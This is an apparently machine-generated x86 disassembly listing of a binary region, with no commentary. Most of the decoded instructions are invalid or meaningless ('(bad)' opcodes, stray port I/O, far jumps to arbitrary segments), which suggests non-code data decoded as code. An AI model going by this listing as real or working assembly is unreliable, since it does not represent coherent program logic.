  41573e:	or     ebp,eax
  415740:	pushf  
  415741:	inc    esp
  415742:	push   ds
  415743:	(bad)  
  415744:	sbb    eax,0xce9cd9f0
  415749:	push   es
  41574a:	icebp  
  41574b:	shl    ebx,cl
  41574d:	add    edi,esp
  41574f:	jle    0x41579b
  415751:	push   ebx
  415752:	push   edi
  415753:	xchg   ecx,eax
  415754:	(bad)  
  415755:	arpl   WORD PTR [edi-0x2e],cx
  415758:	push   cs
  415759:	adc    BYTE PTR [eax],ch
  41575b:	into   
  41575c:	jb     0x415724
  41575e:	dec    esp
  41575f:	jae    0x41572a
  415761:	jbe    0x415722
  415763:	mov    bh,0xc6
  415765:	stc    
  415766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415767:	mov    edi,0x76c8ea7e
  41576c:	mov    es,WORD PTR [edx+0x26]
  41576f:	cmp    al,0x44
  415771:	xor    eax,0x2615139a
  415776:	retf   
  415777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415778:	pop    ds
  415779:	and    dh,0xeb
  41577c:	cmp    cl,BYTE PTR [esi]
  41577e:	daa    
  41577f:	add    ecx,DWORD PTR [edi-0x46]
  415782:	imul   esi,DWORD PTR [edi],0xffffffad
  415785:	lods   al,BYTE PTR ds:[esi]
  415786:	mov    DWORD PTR [edi+0x17],0xf5d4a362
  41578d:	mov    bh,0x1b
  41578f:	cdq    
  415790:	in     al,0x2f
  415792:	sahf   
  415793:	mov    esi,0x8592f67a
  415798:	add    BYTE PTR [esi],bl
  41579a:	jae    0x415811
  41579c:	outs   dx,DWORD PTR ds:[esi]
  41579d:	outs   dx,BYTE PTR ds:[esi]
  41579e:	loop   0x415803
  4157a0:	mov    BYTE PTR [ebx-0x69c8b0df],bl
  4157a6:	mov    esi,0x60d52b40
  4157ab:	mov    cl,dl
  4157ad:	xor    eax,0x85381d2a
  4157b2:	pop    ds
  4157b3:	cmp    al,0x7b
  4157b5:	xor    cl,BYTE PTR [esi]
  4157b7:	inc    edx
  4157b8:	xor    al,0x7
  4157ba:	pop    ss
  4157bb:	arpl   WORD PTR [esi],cx
  4157bd:	in     eax,dx
  4157be:	fdiv   QWORD PTR [ecx+edx*8+0x147d5e27]
  4157c5:	add    esp,DWORD PTR ds:0x45bbd808
  4157cb:	push   ss
  4157cc:	sahf   
  4157cd:	xlat   BYTE PTR ds:[ebx]
  4157ce:	fdivr  QWORD PTR [ecx-0x1a]
  4157d1:	push   ebp
  4157d2:	jmp    0x215c:0xf5074882
  4157d9:	imul   DWORD PTR [ebx-0x30]
  4157dc:	jnp    0x4157bc
  4157de:	push   edx
  4157df:	adc    DWORD PTR [edi],ebp
  4157e1:	mov    bl,0xa5
  4157e3:	(bad)  
  4157e4:	aas    
  4157e5:	inc    eax
  4157e6:	dec    edx
  4157e7:	scas   eax,DWORD PTR es:[edi]
  4157e8:	push   cs
  4157e9:	and    ebp,esp
  4157eb:	ret    
  4157ec:	xchg   ebx,eax
  4157ed:	pop    edi
  4157ee:	mov    ah,BYTE PTR [edi]
  4157f0:	pop    es
  4157f1:	outs   dx,BYTE PTR ds:[esi]
  4157f2:	(bad)  
  4157f3:	stc    
  4157f4:	inc    ebp
  4157f5:	ret    0xd7d4
  4157f8:	xor    esi,0x3e13babb
  4157fe:	inc    eax
  4157ff:	or     bl,ch
  415801:	push   0x295fc09e
  415806:	or     BYTE PTR [eax-0x1dbf08b5],bl
  41580c:	jp     0x4157e9
  41580e:	in     al,0x6a
  415810:	xchg   ecx,eax
	...
  415871:	add    BYTE PTR [eax],al
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	shl    DWORD PTR [ebp+0x18],cl
  415882:	out    dx,eax
  415883:	push   edx
  415884:	xor    ebx,esp
  415886:	add    BYTE PTR [eax],al
  415888:	add    eax,0x21000001
  41588d:	es mov ebx,0x2fb2c62e
  415893:	leave  
  415894:	mov    edx,DWORD PTR [eax-0x53b634fe]
  41589a:	add    al,0x52
  41589c:	es cs in eax,dx
  41589f:	cli    
  4158a0:	retf   
  4158a1:	xchg   ebp,eax
  4158a2:	mov    DWORD PTR [bp+di],esi
  4158a5:	xor    ecx,DWORD PTR [esi]
  4158a7:	inc    esp
  4158a8:	fdivr  st(7),st
  4158aa:	inc    ebx
  4158ab:	or     al,0xc8
  4158ad:	pusha  
  4158ae:	cmp    DWORD PTR [ebp+esi*4-0x589f51e0],ebx
  4158b5:	scas   eax,DWORD PTR es:[edi]
  4158b6:	adc    ch,cl
  4158b8:	shl    edi,1
  4158ba:	js     0x415840
  4158bc:	div    BYTE PTR [ecx]
  4158be:	lods   eax,DWORD PTR ds:[esi]
  4158bf:	fadd   st(6),st
  4158c1:	mov    ds:0x8812783d,al
  4158c6:	push   ds
  4158c7:	or     al,0xc1
  4158c9:	push   ebx
  4158ca:	jmp    0x93b6f470
  4158cf:	cld    
  4158d0:	shl    BYTE PTR [ebp+esi*2-0x5fdb7327],cl
  4158d7:	ja     0x41591c
  4158d9:	(bad)  
  4158da:	cmp    eax,0x25c6e83f
  4158df:	cld    
  4158e0:	dec    ebx
  4158e1:	jg     0x415881
  4158e3:	icebp  
  4158e4:	fild   DWORD PTR [ebx-0x455b9583]
  4158ea:	ret    
  4158eb:	fucom  st(0)
  4158ed:	inc    edx
  4158ee:	push   0x708990a6
  4158f3:	mov    edi,DWORD PTR [eax+0xce1bfe4]
  4158f9:	sbb    eax,0x5f0fbdff
  4158fe:	xlat   BYTE PTR ds:[ebx]
  4158ff:	rcr    BYTE PTR ds:0x82bed26e,cl
  415905:	xchg   ecx,eax
  415906:	or     esi,DWORD PTR [eax-0x1f6a403]
  41590c:	inc    edx
  41590d:	dec    esi
  41590e:	stos   BYTE PTR es:[edi],al
  41590f:	pop    ds
  415910:	pop    esp
  415911:	jle    0x41596d
  415913:	push   0xdef01d43
  415918:	fldenv [edi-0x2f]
  41591b:	test   eax,0xa8e991b0
  415920:	imul   eax,ebp,0x52
  415923:	sbb    eax,0x653ec17c
  415928:	fdiv   DWORD PTR ds:0x3e36d07b
  41592e:	ror    DWORD PTR [ecx+0x7c],1
  415931:	mov    dl,0x5f
  415933:	out    0x51,al
  415935:	ror    DWORD PTR [esi+ecx*2-0x381aab3d],cl
  41593c:	xor    eax,0x369e9d11
  415941:	cwde   
  415942:	sbb    edi,DWORD PTR [ebx-0x6e]
  415945:	fiadd  WORD PTR [eax-0xa]
  415948:	push   eax
  415949:	nop
  41594a:	fadd   DWORD PTR [edi]
  41594c:	aam    0x46
  41594e:	dec    eax
  41594f:	mov    cl,0x9c
  415951:	and    DWORD PTR [ebp+0x5b9a0679],edi
  415957:	jp     0x4158e5
  415959:	stc    
  41595a:	into   
  41595b:	ror    ecx,cl
  41595d:	jg     0x4158ed
  41595f:	lea    ebx,[ecx+0x29]
  415962:	cmp    DWORD PTR [ebx-0x122e1ff5],0xbcfa270b
  41596c:	rol    BYTE PTR [edi-0x50],cl
  41596f:	inc    edi
  415970:	mov    eax,ds:0x12147e35
  415975:	and    DWORD PTR [edi+0x629fdbfa],edx
  41597b:	icebp  
  41597c:	shl    BYTE PTR [esi],1
  41597e:	pushf  
  41597f:	dec    ebx
  415980:	and    eax,0x611151b
  415985:	repnz dec ebp
  415987:	mov    WORD PTR [edx-0x7d],ds
  41598a:	inc    esi
  41598b:	xor    BYTE PTR [eax-0x30],cl
  41598e:	mov    ebp,0xe7ad
	...
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	in     eax,0x98
  415a02:	(bad)  
  415a03:	aad    0x36
  415a05:	in     al,0x0
  415a07:	add    BYTE PTR ds:0x91000001,al
  415a0d:	jge    0x4159ef
  415a0f:	mov    ch,0x7b
  415a11:	adc    DWORD PTR [edx+0x66],eax
  415a14:	jl     0x415a21
  415a16:	(bad)  
  415a17:	nop
  415a18:	xchg   BYTE PTR [ebx+eiz*2+0x4d1964b4],ch
  415a1f:	sub    DWORD PTR [ebx+0x3c],ecx
  415a22:	das    
  415a23:	add    BYTE PTR ds:0x4b22bee9,0x85
  415a2a:	inc    edi
  415a2b:	cwde   
  415a2c:	jns    0x415a28
  415a2e:	les    ebx,FWORD PTR [ebp+0x16]
  415a31:	inc    edi
  415a32:	push   ebx
  415a33:	call   0x96e3:0x9da1eaa9
  415a3a:	arpl   WORD PTR [edi],cx
  415a3c:	stc    
  415a3d:	pop    eax
  415a3e:	test   al,0xe
  415a40:	mov    esp,cs
  415a42:	cmp    BYTE PTR [edi+0x8b44f71],0xb6
  415a49:	jbe    0x415a76
  415a4b:	push   esp
  415a4c:	add    BYTE PTR ds:0x44ed2cfc,ah
  415a52:	jae    0x415a48
  415a54:	scas   al,BYTE PTR es:[edi]
  415a55:	jo     0x415a67
  415a57:	jmp    0x7fde5217
  415a5c:	mov    dl,0x17
  415a5e:	mov    ch,0x7d
  415a60:	nop
  415a61:	sti    
  415a62:	push   esi
  415a63:	mov    WORD PTR [edx],fs
  415a65:	xchg   BYTE PTR [ecx-0x79efa15c],cl
  415a6b:	pop    es
  415a6c:	and    DWORD PTR [eax-0x18],esp
  415a6f:	(bad)  
  415a70:	in     eax,0x93
  415a72:	rcl    eax,1
  415a74:	inc    ebx
  415a75:	jle    0x415a79
  415a77:	dec    edi
  415a78:	mov    ebx,0x17dd737d
  415a7d:	arpl   sp,si
  415a7f:	adc    al,0x29
  415a81:	mov    edx,0xccd787c8
  415a86:	loope  0x415aa0
  415a88:	mov    esp,0x4a8ae0a7
  415a8d:	adc    DWORD PTR [ecx+0x53e98038],ebx
  415a93:	popa   
  415a94:	xchg   esi,eax
  415a95:	add    ebp,ebx
  415a97:	lock cmp ecx,DWORD PTR [edx]
  415a9a:	sub    DWORD PTR [ebx+0x66],edx
  415a9d:	test   BYTE PTR fs:[ebx],ah
  415aa0:	push   cs
  415aa1:	mov    BYTE PTR [edi+0x48],ah
  415aa4:	ret    
  415aa5:	imul   al
  415aa7:	add    esi,edx
  415aa9:	imul   edx,DWORD PTR [ebx+eax*1+0x73287a0e],0xc367bd28
  415ab4:	inc    esp
  415ab5:	lahf   
  415ab6:	cmp    al,0x2b
  415ab8:	mov    eax,DWORD PTR [edi-0x5f]
  415abb:	mov    bl,0xe8
  415abd:	pop    ecx
  415abe:	ins    DWORD PTR es:[edi],dx
  415abf:	mov    bl,0x0
  415ac1:	sub    bh,BYTE PTR [ebp+0x16]
  415ac4:	sbb    eax,0x2f18a690
  415ac9:	adc    BYTE PTR [edi],cl
  415acb:	imul   ax,WORD PTR [ebp+0x3004f43],0xf996
  415ad4:	push   edi
  415ad5:	xor    al,0x23
  415ad7:	fs ins DWORD PTR es:[edi],dx
  415ad9:	addr16 and eax,0x89c56ca8
  415adf:	stos   DWORD PTR es:[edi],eax
  415ae0:	sbb    DWORD PTR [ebp+eax*2+0x76],edi
  415ae4:	out    0x71,eax
  415ae6:	dec    ebp
  415ae7:	and    eax,0x409ab554
  415aec:	pop    eax
  415aed:	aas    
  415aee:	arpl   WORD PTR [edi+0x7b44d6dd],ax
  415af4:	ror    BYTE PTR [ebx+0x2cffdad4],1
  415afa:	or     bh,dh
  415afc:	stos   BYTE PTR es:[edi],al
  415afd:	stos   BYTE PTR es:[edi],al
  415afe:	lods   eax,DWORD PTR ds:[esi]
  415aff:	mov    cl,al
  415b01:	dec    ebp
  415b02:	and    ebp,edx
  415b04:	cmc    
  415b05:	pop    eax
  415b06:	sbb    al,0x4b
  415b08:	sbb    BYTE PTR [ebx-0x5],ch
  415b0b:	mov    esi,0xe7860aba
  415b10:	xor    eax,DWORD PTR [eax]
	...
  415b72:	add    BYTE PTR [eax],al
  415b74:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fcomp  QWORD PTR [ecx+0x3b70c722]
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR ds:0xac000001,al
  415b8d:	test   eax,0x5881af3b
  415b92:	cdq    
  415b93:	icebp  
  415b94:	rol    DWORD PTR [edi],0x7c
  415b97:	dec    edx
  415b98:	dec    ebp
  415b99:	fist   WORD PTR [ebp-0x64]
  415b9c:	xrstor [edi+0x74]
  415ba0:	jg     0x415b90
  415ba2:	fbld   TBYTE PTR [edx]
  415ba4:	leave  
  415ba5:	int3   
  415ba6:	push   ss
  415ba7:	adc    BYTE PTR [esi+0x38fa516d],0x24
  415bae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415baf:	mov    dl,0xc5
  415bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bb2:	jae    0x415c17
  415bb4:	xor    eax,0xa084c7c6
  415bb9:	sub    BYTE PTR [ebp-0x691145bc],ch
  415bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bc0:	imul   DWORD PTR ds:0x67403f31
  415bc6:	jnp    0x415b57
  415bc8:	jno    0x415b9d
  415bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bcb:	retf   0x5157
  415bce:	pop    ds
  415bcf:	cmp    BYTE PTR [esi-0x5b787fc1],0x85
  415bd6:	jge    0x415b76
  415bd8:	mov    eax,ds:0x2e51abd1
  415bdd:	cmp    ch,BYTE PTR [ebp-0x108fa5e4]
  415be3:	sbb    esi,DWORD PTR [eax]
  415be5:	add    bl,BYTE PTR [edx-0x76f16ea]
  415beb:	sti    
  415bec:	mov    ah,ch
  415bee:	and    BYTE PTR cs:[edi-0x9d7cf65],0xd2
  415bf6:	adc    BYTE PTR [ecx],0xcb
  415bf9:	mov    ds:0x5354300d,al
  415bfe:	mulps  xmm0,xmm7
  415c01:	ror    DWORD PTR [ecx+0x66],cl
  415c04:	cmp    DWORD PTR [edi],ebx
  415c06:	mov    edi,0xd084b6ad
  415c0b:	rol    ah,1
  415c0d:	xchg   ebp,eax
  415c0e:	cmc    
  415c0f:	movaps xmm7,xmm0
  415c12:	mov    edi,0x958a976a
  415c17:	into   
  415c18:	dec    edi
  415c19:	imul   ebp,DWORD PTR [edx],0x26a0a665
  415c1f:	and    eax,0x23cb66ac
  415c24:	jns    0x415bfc
  415c26:	adc    DWORD PTR [ebp-0x74],edx
  415c29:	mov    ebx,0xeab78b97
  415c2e:	xchg   BYTE PTR [esi-0x5767014e],bh
  415c34:	jnp    0x415c4a
  415c36:	jmp    DWORD PTR [edx]
  415c38:	and    al,0xe4
  415c3a:	sahf   
  415c3b:	adc    al,0xfe
  415c3d:	arpl   WORD PTR [ebx],ax
  415c3f:	jp     0x415bce
  415c41:	xchg   ebx,eax
  415c42:	and    BYTE PTR [esi],bl
  415c44:	pop    ebx
  415c45:	cmp    al,0x14
  415c47:	mov    esp,0x58235290
  415c4c:	in     al,dx
  415c4d:	xor    bl,0xd6
  415c50:	dec    ecx
  415c51:	mov    ah,0x5
  415c53:	scas   eax,DWORD PTR es:[edi]
  415c54:	fcom   DWORD PTR [eax-0xd]
  415c57:	imul   ebx,DWORD PTR [eiz*4-0x58f4e13c],0xffffffd4
  415c5f:	jecxz  0x415c5a
  415c61:	jns    0x415c16
  415c63:	lds    ebx,FWORD PTR [esi+0x7c]
  415c66:	dec    edi
  415c67:	and    ah,BYTE PTR [ebx-0x49ffde8d]
  415c6d:	mov    esi,0x996208a1
  415c72:	pop    edi
  415c73:	dec    edx
  415c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c75:	stos   BYTE PTR es:[edi],al
  415c76:	dec    edi
  415c77:	jmp    0x7c2bb7cb
  415c7c:	lock pop ebp
  415c7e:	cmc    
  415c7f:	or     esi,eax
  415c81:	pop    ecx
  415c82:	push   cs
  415c83:	je     0x415c51
  415c85:	xchg   DWORD PTR [ecx],ecx
  415c87:	in     eax,dx
  415c88:	mov    ecx,0x7d04d8c
  415c8d:	jne    0x415c4b
  415c8f:	inc    ebp
  415c90:	jecxz  0x415c92
	...
  415cf2:	add    BYTE PTR [eax],al
  415cf4:	cmp    dl,BYTE PTR [eax]
  415cf6:	mov    edi,0xbbbfbf3c
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x744d301f
  415d03:	xchg   edx,eax
  415d04:	inc    eax
  415d05:	out    0x0,al
  415d07:	add    BYTE PTR ds:0xd1000001,al
  415d0d:	jecxz  0x415cd0
  415d0f:	imul   esp,DWORD PTR [edx+0x7],0xbe07433d
  415d16:	fnstenv [edi+0x3]
  415d19:	pop    eax
  415d1a:	adc    BYTE PTR [esi],0x86
  415d1d:	mov    edx,0x97efbf23
  415d22:	jl     0x415cb2
  415d24:	cdq    
  415d25:	aad    0x77
  415d27:	pop    eax
  415d28:	push   0xa79b0c9e
  415d2d:	adc    eax,0x61ad1f02
  415d32:	jae    0x415cd8
  415d34:	int3   
  415d35:	sbb    DWORD PTR [edi],0x62
  415d38:	mov    esp,0x99eb6cd0
  415d3d:	popa   
  415d3e:	mov    ecx,0x5e3328fd
  415d43:	jne    0x415da3
  415d45:	(bad)  
  415d46:	adc    edi,DWORD PTR [edx+0x75]
  415d49:	shl    BYTE PTR [edi-0x49],0x69
  415d4d:	sub    ebp,eax
  415d4f:	dec    edx
  415d50:	pop    ebp
  415d51:	mov    ds:0xffce078c,eax
  415d56:	or     BYTE PTR [ebp+0x51],bh
  415d59:	or     BYTE PTR [edi+0x4ee6f356],dl
  415d5f:	jns    0x415d27
  415d61:	push   esp
  415d62:	and    bh,cl
  415d64:	pop    ebx
  415d65:	xor    esp,DWORD PTR [edi+esi*8]
  415d68:	psubusw mm2,QWORD PTR [ecx-0x55c7dea2]
  415d6f:	mov    al,ds:0xdab4838d
  415d74:	mov    al,0x6d
  415d76:	das    
  415d77:	addr16 fwait
  415d79:	xchg   ecx,eax
  415d7a:	mov    edi,DWORD PTR [edx-0x3f]
  415d7d:	jmp    0x415d89
  415d7f:	xchg   esi,eax
  415d80:	sbb    eax,edi
  415d82:	jp     0x415dad
  415d84:	and    BYTE PTR [ebx-0x62],dl
  415d87:	cmp    BYTE PTR [eax+0x4a],bh
  415d8a:	lea    ebp,[eax+0x1f7a2305]
  415d90:	inc    ecx
  415d91:	cli    
  415d92:	scas   al,BYTE PTR es:[edi]
  415d93:	setnp  BYTE PTR [esi-0x25d1036c]
  415d9a:	ret    0xecdf
  415d9d:	shl    DWORD PTR [edi],0xf2
  415da0:	nop
  415da1:	bound  eax,QWORD PTR [ebp-0x47d682bf]
  415da7:	aad    0xb
  415da9:	jae    0x415d54
  415dab:	imul   ebp,DWORD PTR [ebx+0x45],0xffffff86
  415daf:	enter  0x46fe,0x0
  415db3:	pop    edi
  415db4:	call   0x4bae:0x94111277
  415dbb:	in     eax,0xa9
  415dbd:	mov    ah,0x40
  415dbf:	push   ebx
  415dc0:	pop    edx
  415dc1:	ins    DWORD PTR es:[edi],dx
  415dc2:	imul   ebp,DWORD PTR [edx],0x33ae3ac1
  415dc8:	cmp    BYTE PTR [edx-0x4e],dl
  415dcb:	cmp    ebx,DWORD PTR [ebx]
  415dcd:	dec    BYTE PTR cs:[edx-0x3b]
  415dd1:	jg     0x415dd1
  415dd3:	repnz out dx,eax
  415dd5:	je     0x415e0f
  415dd7:	pop    esi
  415dd8:	lods   al,BYTE PTR ds:[esi]
  415dd9:	fldenv [edx+edi*4-0x43]
  415ddd:	pop    ecx
  415dde:	xlat   BYTE PTR ds:[ebx]
  415ddf:	loopne 0x415d8e
  415de1:	mov    ch,0x2e
  415de3:	pop    esi
  415de4:	sahf   
  415de5:	stos   DWORD PTR es:[edi],eax
  415de6:	or     dl,BYTE PTR [eax+0x68c33b56]
  415dec:	xor    ah,0x7f
  415def:	icebp  
  415df0:	sbb    DWORD PTR [esp+esi*8],esp
  415df3:	mov    edi,0xe8b9265
  415df8:	xor    DWORD PTR [ebx],esi
  415dfa:	ret    0x7ab0
  415dfd:	int3   
  415dfe:	les    esp,FWORD PTR [ebx]
  415e00:	and    eax,0xee7afa9c
  415e05:	push   edi
  415e06:	cdq    
  415e07:	adc    DWORD PTR fs:[edx+0x75],ecx
  415e0b:	sahf   
  415e0c:	jge    0x415e6a
  415e0e:	imul   eax,DWORD PTR [ebp+0x6e],0x0
	...
  415e72:	add    BYTE PTR [eax],al
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x40]
  415e81:	lahf   
  415e82:	mov    dh,0x47
  415e84:	inc    ebp
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR ds:0xaf000001,al
  415e8d:	icebp  
  415e8e:	xchg   esi,eax
  415e8f:	mov    al,0x21
  415e91:	pop    ss
  415e92:	push   edx
  415e93:	inc    ebx
  415e94:	int3   
  415e95:	jo     0x415ee5
  415e97:	add    DWORD PTR [ecx-0x61eae969],eax
  415e9d:	mov    eax,ds:0x14af5e17
  415ea2:	push   esi
  415ea3:	mov    dh,0x5a
  415ea5:	add    DWORD PTR [edx],0xa942b92b
  415eab:	out    dx,eax
  415eac:	jp     0x415ec3
  415eae:	and    eax,0x7e83c3c1
  415eb3:	sbb    eax,0x9521f7e5
  415eb8:	mov    esi,0x7c581567
  415ebd:	std    
  415ebe:	sub    ebp,DWORD PTR [edi+0xb]
  415ec1:	pop    edx
  415ec2:	or     BYTE PTR [edi],ah
  415ec4:	(bad)  
  415ec5:	mov    al,ds:0x5eb0fe79
  415eca:	inc    esi
  415ecb:	mov    bh,0x77
  415ecd:	int    0xc8
  415ecf:	and    eax,0x4733819
  415ed4:	mov    cl,0x47
  415ed6:	cmp    al,0xad
  415ed9:	sbb    al,BYTE PTR [ebx-0xadcb45]
  415edf:	add    eax,0xccbd877e
  415ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ee5:	sub    DWORD PTR [esi+0x2c],edx
  415ee8:	(bad)  
  415ee9:	in     eax,dx
  415eea:	mov    ds:0xec0ed32f,eax
  415eef:	or     dl,BYTE PTR [ecx-0xb]
  415ef2:	inc    esi
  415ef3:	test   DWORD PTR [edx+0x4dc94e09],ebx
  415ef9:	dec    ecx
  415efa:	xchg   edi,eax
  415efb:	fstp   DWORD PTR [edi]
  415efd:	inc    esp
  415efe:	shl    BYTE PTR [ecx-0x59],cl
  415f01:	add    ebp,DWORD PTR [edi+0x6c]
  415f04:	ja     0x415e89
  415f06:	fnstcw WORD PTR [ebp-0x3cdc7abf]
  415f0c:	(bad)  
  415f0e:	dec    eax
  415f0f:	call   0x720fee8d
  415f14:	(bad)  
  415f15:	ins    DWORD PTR es:[edi],dx
  415f16:	int3   
  415f17:	addr16 mov al,ds:0x6433
  415f1b:	mov    DWORD PTR [eax+0x12],0x101e3621
  415f22:	ss xor eax,0xe4d9e8c
  415f28:	add    ch,BYTE PTR [esi]
  415f2a:	test   DWORD PTR [esi],ecx
  415f2c:	jl     0x415f97
  415f2e:	fs (bad) 
  415f30:	push   0xb
  415f32:	(bad)  [eax-0x6c]
  415f35:	and    BYTE PTR [esi+0x54d9420e],cl
  415f3b:	mov    ds:0x3596050a,al
  415f40:	cmp    BYTE PTR [edx],0x78
  415f43:	and    al,0xee
  415f45:	imul   ebx,ebp,0x2c91dc17
  415f4b:	addr16 jle 0x415ed7
  415f4e:	ja     0x415f9f
  415f50:	cmc    
  415f51:	(bad)  
  415f52:	loop   0x415f2e
  415f54:	shl    BYTE PTR [ebx+0x22bae222],cl
  415f5a:	in     eax,0xfe
  415f5c:	gs push esi
  415f5f:	xlat   BYTE PTR ds:[ebx]
  415f60:	push   ecx
  415f61:	push   ss
  415f62:	mov    ebp,DWORD PTR [esi]
  415f64:	or     DWORD PTR [edx],ebp
  415f66:	xchg   dl,ch
  415f68:	xor    BYTE PTR [edx],ch
  415f6a:	cmp    eax,ebp
  415f6c:	jl     0x415fbe
  415f6e:	scas   al,BYTE PTR es:[edi]
  415f6f:	ret    0xbfb0
  415f72:	pop    edx
  415f73:	cmp    BYTE PTR [esi+0x1e],bl
  415f76:	mov    ebx,0x862ca513
  415f7b:	push   ds
  415f7c:	hlt    
  415f7d:	iret   
  415f7e:	iret   
  415f7f:	cmp    esp,DWORD PTR [eax]
  415f81:	mov    ebp,ebp
  415f83:	frstor [ebx]
  415f85:	xchg   ebx,eax
  415f86:	pushf  
  415f87:	leave  
  415f88:	and    DWORD PTR [ecx],ebp
  415f8a:	push   ecx
  415f8b:	fdivr  DWORD PTR [ebx-0x3d]
  415f8e:	xlat   BYTE PTR ds:[ebx]
  415f8f:	out    dx,al
  415f90:	push   ss
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	shl    DWORD PTR [eax-0x17b540c8],cl
  416006:	add    BYTE PTR [eax],al
  416008:	add    eax,0x12000001
  41600d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41600e:	adc    esp,DWORD PTR ds:0x240426bf
  416014:	mov    WORD PTR [ecx],ss
  416016:	sahf   
  416017:	retf   
  416018:	xor    al,0xb2
  41601a:	pop    edx
  41601b:	in     al,0x85
  41601d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41601e:	mov    ebx,0xa3749f71
  416023:	lea    ebp,[edi+0x14288549]
  416029:	nop
  41602a:	pushf  
  41602b:	loopne 0x416096
  41602d:	loope  0x416045
  41602f:	(bad)  
  416031:	and    bl,bl
  416033:	or     ch,BYTE PTR [esi-0x22]
  416036:	or     eax,0x72b7bd85
  41603b:	sbb    ch,dl
  41603d:	sub    bl,BYTE PTR [edi]
  41603f:	push   ebx
  416040:	(bad)  
  416041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416042:	aam    0xd1
  416044:	mov    ah,0x66
  416046:	stc    
  416047:	pop    ds
  416048:	aam    0x89
  41604a:	mov    al,ds:0xe90cec7d
  41604f:	mov    al,0xdb
  416051:	gs jno 0x416057
  416054:	xchg   ebx,eax
  416055:	add    eax,0x6e51f707
  41605a:	lea    ebx,[ebx]
  41605c:	mov    esi,0x723d4939
  416061:	les    ebx,FWORD PTR [ebx+0xe]
  416064:	dec    esi
  416065:	mov    eax,ds:0x9008d1e8
  41606a:	mov    dl,0x46
  41606c:	aaa    
  41606d:	sar    al,1
  41606f:	call   0xd1a3:0x8418141b
  416076:	fld    TBYTE PTR [ecx+ebx*8+0x50958133]
  41607d:	(bad)  
  41607f:	push   0x7b
  416081:	bnd jns 0x41605c
  416084:	mov    fs:0xcc3edd2c,al
  41608a:	add    BYTE PTR [edx+0x420a3185],0xf5
  416091:	mov    eax,0xd11f1067
  416096:	and    ebp,DWORD PTR [ebx+esi*1]
  416099:	sbb    esi,eax
  41609b:	mov    edx,0xe16d284
  4160a0:	mov    ecx,0x503239a
  4160a5:	jbe    0x4160d2
  4160a7:	fild   DWORD PTR ds:[ebp+0x23af621e]
  4160ae:	in     al,dx
  4160af:	push   edi
  4160b0:	sbb    ch,BYTE PTR [ecx]
  4160b2:	and    bh,dl
  4160b4:	cmp    DWORD PTR [ebx-0x31],ecx
  4160b7:	dec    esi
  4160b8:	xor    BYTE PTR [eax],0x26
  4160bb:	cdq    
  4160bc:	add    BYTE PTR [edx+0x23],cl
  4160bf:	add    edx,DWORD PTR [ebx+0x7eb9172d]
  4160c5:	mov    dh,BYTE PTR [edx+0x3892533c]
  4160cb:	sahf   
  4160cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160cd:	pop    ebp
  4160ce:	lea    esi,[esi+0x3ce5aa74]
  4160d4:	fs mov ch,0x79
  4160d7:	cmp    eax,0x8d34889a
  4160dc:	add    DWORD PTR [ecx+eiz*2+0xd28edb1],ebx
  4160e3:	cs xchg edi,eax
  4160e5:	enter  0xd65a,0x84
  4160e9:	scas   al,BYTE PTR es:[edi]
  4160ea:	dec    ecx
  4160eb:	pop    ebx
  4160ec:	inc    edx
  4160ed:	dec    edx
  4160ee:	pop    edx
  4160ef:	ret    0x93f0
  4160f2:	cwde   
  4160f3:	dec    ecx
  4160f4:	scas   eax,DWORD PTR es:[edi]
  4160f5:	pop    ebp
  4160f6:	in     eax,0x27
  4160f8:	inc    ebp
  4160f9:	adc    eax,0x9bc12c42
  4160fe:	or     al,ah
  416100:	and    esp,esp
  416102:	xor    bl,BYTE PTR [edi]
  416104:	test   dh,dh
  416106:	sar    ebp,0xa2
  416109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41610a:	xchg   si,ax
  41610c:	ret    
  41610d:	or     DWORD PTR [ebx+ebx*1+0xc8],esp
	...
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0x68416cf3
  416183:	inc    ecx
  416184:	dec    edi
  416185:	jmp    0x146618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	pop    ss
  41618d:	jmp    0x41613f
  41618f:	loop   0x416169
  416191:	sbb    dh,BYTE PTR [edx+0x26346c2f]
  416197:	ja     0x4161b9
  416199:	fwait
  41619a:	and    ecx,DWORD PTR [ebp+0x260b7526]
  4161a0:	call   0xf6468ac6
